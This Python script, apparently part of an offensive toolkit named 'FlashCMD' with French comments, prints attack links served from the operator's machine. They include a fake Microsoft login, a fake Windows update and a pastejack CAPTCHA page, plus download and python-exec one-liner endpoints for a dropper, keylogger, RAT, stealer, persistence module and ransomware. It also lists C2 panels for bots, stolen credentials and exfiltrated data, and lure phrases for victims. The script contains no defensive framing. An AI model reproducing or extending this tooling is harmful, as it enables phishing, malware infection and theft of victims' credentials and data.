#!/usr/bin/env python3
"""
generate.py — génère et affiche tous les liens piégés
Usage : python generate.py [ip] [port]
"""
import sys, socket

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

IP   = sys.argv[1] if len(sys.argv) > 1 else get_local_ip()
PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE = f"http://{IP}:{PORT}"

SEP = "─" * 60

print(f"\n{'='*60}")
print(f"  FlashCMD — Liens piégés")
print(f"  Serveur : {BASE}")
print(f"{'='*60}")

print(f"\n  PAGES PIÈGE")
print(SEP)
pages = [
    ("Phishing Microsoft (login)",   "/"),
    ("Fausse MAJ Windows",           "/update"),
    ("Faux CAPTCHA (pastejack)",     "/captcha"),
]
for name, path in pages:
    print(f"  {name:<35} {BASE}{path}")

print(f"\n  PAYLOADS DIRECTS")
print(SEP)
payloads = [
    ("Dropper chain (tout installe)", "dropper"),
    ("Keylogger seul",                "keylogger"),
    ("RAT seul",                      "rat"),
    ("Stealer seul",                  "stealer"),
    ("Persistence seul",              "persistence"),
    ("Ransomware",                    "ransomware"),
]
for name, pname in payloads:
    print(f"  {name:<35} {BASE}/payload?name={pname}")

print(f"\n  ONE-LINERS (python3 -c exec…)")
print(SEP)
for name, pname in payloads[:4]:
    print(f"  {name:<35} {BASE}/oneliner?name={pname}")

print(f"\n  C2 / ADMIN")
print(SEP)
admin = [
    ("Dashboard web",    "/c2"),
    ("Liste des bots",   "/c2/bots"),
    ("Credentials",      "/c2/creds"),
    ("Données exfiltrées","/c2/exfil"),
    ("Log visites",      "/c2/visits"),
]
for name, path in admin:
    print(f"  {name:<35} {BASE}{path}")

print(f"\n  SOCIAL ENGINEERING")
print(SEP)
print(f'  "Vérifiez votre compte maintenant"  → {BASE}/')
print(f'  "Mettez à jour Windows"             → {BASE}/update')
print(f'  "Prouvez que vous n\'êtes pas un bot" → {BASE}/captcha')

print(f"\n  LANCEMENT")
print(SEP)
print(f"  Serveur  : python server.py")
print(f"  C2 CLI   : python c2/c2_server.py {BASE}")
print(f"{'='*60}\n")